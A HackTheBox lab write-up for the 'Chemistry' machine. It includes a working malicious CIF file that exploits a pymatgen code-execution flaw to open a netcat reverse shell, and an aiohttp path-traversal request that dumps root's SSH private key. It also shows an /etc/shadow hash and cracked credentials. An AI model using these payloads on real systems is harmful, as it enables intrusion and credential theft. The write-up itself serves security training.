# Chemistry - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏Chemistry.JPG](images/Chemistry.JPG)
 
## TL;DR

***User***: Exploited `CVE-2024-23346` to achieve RCE by uploading a malicious `CIF` file, resulting in a reverse shell as the `app` user. Discovered the password for the `rosa` user in the `database.md` file.

***Root***: Identified a local port `8080` hosting a web application using `aiohttp`. Exploited `CVE-2024-23334` to achieve `LFI`, allowing retrieval of the `root` private SSH key.

![pwn.JPG](images/pwn.JPG)


## Chemistry Solution

### User

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar9@parrot]─[/hackthebox/Chemistry]
└──╼ $ nmap -sV -sC -oA nmap/Chemistry 10.10.11.38
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-18 22:30 IST
Nmap scan report for 10.10.11.38
Host is up (0.075s latency).
Not shown: 996 closed tcp ports (conn-refused)
Bug in uptime-agent-info: no string output.
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6fc20ae9d1d451d0bced9d020f26fdc (RSA)
|   256 f1ae1c3e1dea55446c2ff2568d623c2b (ECDSA)
|_  256 94421b78f25187073e9726c9a25c0a26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 18 Jan 2025 20:30:02 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
9998/tcp open  tcpwrapped
9999/tcp open  http       SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=7%D=1/18%Time=678C0F6F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\x20
SF:Python/3\.9\.5\r\nDate:\x20Sat,\x2018\x20Jan\x202025\x2020:30:02\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UT
SF:F-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=d
SF:evice-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemistry
SF:\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x20\x
SF:20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=\"c
SF:ontainer\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">Che
SF:mistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Welc
SF:ome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x20a
SF:llows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20Infor
SF:mation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20cont
SF:ained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"
SF:buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center><a\
SF:x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Regis
SF:ter</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\
SF:x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\
SF:x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x
SF:20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content
SF:-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20reque
SF:st\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</bo
SF:dy>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Observing port `5000`, we notice that the following webpage is hosted:

![port5000.JPG](images/port5000.JPG)

On port `9999`, the following content is displayed:

![port9999.JPG](images/port9999.JPG)

Examining the file `database.db`, we observe the following tables:
```console
┌─[evyatar9@parrot]─[/hackthebox/Chemistry]
└──╼ $ sqlite3 database.db 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
structure  user     
sqlite> select * from user ;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|asd|7815696ecbf1c96e6894b779456d330e
16|hakku|cc03e747a6afbbcbf8be7668acfebee5
17|test|202cb962ac59075b964b07152d234b70

```

We might need those hashes later.

Let's register on the webpage hosted on port `5000`:

![register.JPG](images/register.JPG)

After successfully logging in, we are presented with the following dashboard:

![dashboard.JPG](images/dashboard.JPG)

As we can see, this portal requests the upload of a `CIF` file. An example of this file can be downloaded from: http://10.10.11.38:5000/static/example.cif:
```console
┌─[evyatar9@parrot]─[/hackthebox/Chemistry]
└──╼ $ cat example.cif 
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

```

We can achieve RCE by uploading a malicious `CIF` file. More details about this can be found at: https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0.

Let's upload the following exploit file:
```console
┌─[evyatar9@parrot]─[/hackthebox/Chemistry]
└──╼ $ cat exploit.cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.14 4242 -e /bin/bash");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

By clicking the `View` button, we trigger our code:

![view.JPG](images/view.JPG)

This results in a reverse shell:
```console
┌─[evyatar9@parrot]─[/hackthebox/Chemistry]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
10.10.11.38: inverse host lookup failed: Unknown host
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.38] 42044
whoami
app

```

In the `home` directory, we can see that the user `rosa` exists.

By using `john`, we can crack the hash `63ed86ee9f624c7b14f1d4f43dc251a5` from the `database.db` file, which is `unicorniosrosados`.

Let's use this password for SSH login:
```console
┌─[evyatar9@parrot]─[/hackthebox/Chemistry]
└──╼ $ ssh rosa@10.10.11.38
The authenticity of host '10.10.11.38 (10.10.11.38)' can't be established.
ECDSA key fingerprint is SHA256:dA5ziYneQdL2rpHt1KIbpl7EQwZtsehS7ovqWqI7cMs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.38' (ECDSA) to the list of known hosts.
rosa@10.10.11.38's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 18 Jan 2025 09:33:06 PM UTC

  System load:           0.0
  Usage of /:            81.6% of 5.08GB
  Memory usage:          33%
  Swap usage:            0%
  Processes:             239
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:fe94:d637


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jan 18 14:18:11 2025 from 10.10.14.14
rosa@chemistry:~$ cat user.txt 
ec3a1782ce8de7d6a93c42b77598a867
```

And we get the user flag `ec3a1782ce8de7d6a93c42b77598a867`.

### Root

By running `netstat -tulpan`, we can observe the following output:
```console
rosa@chemistry:~$ netstat -tulpan
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9997            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.10.11.38:49800       10.10.14.12:4242        ESTABLISHED -                   
tcp        1      0 10.10.11.38:56198       10.10.14.28:443         CLOSE_WAIT  -                   
tcp        1      0 10.10.11.38:5000        10.10.14.28:58364       CLOSE_WAIT  -                   
tcp        0      1 10.10.11.38:46594       8.8.8.8:53              SYN_SENT    -                   
tcp        0      0 10.10.11.38:5000        10.10.14.21:51642       ESTABLISHED -                   
tcp        0     36 10.10.11.38:22          10.10.14.12:51764       ESTABLISHED -                   
tcp        1      0 10.10.11.38:5000        10.10.14.28:33390       CLOSE_WAIT  -                   
tcp        0      0 10.10.11.38:5000        10.10.14.12:56712       ESTABLISHED -                   
tcp        0      0 10.10.11.38:36818       10.10.14.21:4444        ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:36956         127.0.0.53:53           ESTABLISHED -         
```

We can see that port `8080` is open. Let's access this port using local port forwarding with the following command: `ssh -L 8081:127.0.0.1:8080 rosa@10.10.11.38`.

Now, by browsing to http://127.0.0.1:8081, we get the following page:

![port8080.JPG](images/port8080.JPG)

Nothing is found on this website, but when I looked at the server headers, we can see the following server:
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 643
Date: Sat, 18 Jan 2025 21:45:51 GMT
Server: Python/3.9 aiohttp/3.9.1
...
```

We can see that the server is running `aiohttp/3.9.1`, which is vulnerable to LFI. We can use the following PoC: [https://github.com/s4botai/CVE-2024-23334-PoC](https://github.com/s4botai/CVE-2024-23334-PoC).

```console
┌─[evyatar9@parrot]─[/hackthebox/Chemistry/CVE-2024-23334-PoC]
└──╼ $ bash lfi.sh -u http://127.0.0.1:8081/assets/ -f /root/.ssh/id_rsa

[+] The payload http://127.0.0.1:8081/assets/../../..//root/.ssh/id_rsa returned the following content
:

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

Let's save the `root` SSH private key and use it for SSH login:
```console
┌─[evyatar9@parrot]─[/hackthebox/Chemistry/CVE-2024-23334-PoC]
└──╼ $ ssh -i id_rsa root@10.10.11.38
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 18 Jan 2025 10:00:19 PM UTC

  System load:           0.22
  Usage of /:            84.4% of 5.08GB
  Memory usage:          31%
  Swap usage:            0%
  Processes:             243
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:fe94:d637


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct 11 14:06:59 2024
root@chemistry:~# cat root.txt 
2d92cb5325211f98feb10f46c03bf012
```

And we get the root flag `2d92cb5325211f98feb10f46c03bf012`.


PDF password:
```console
root@chemistry:~# cat /etc/shadow | grep root | cut -d':' -f2
$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.
```
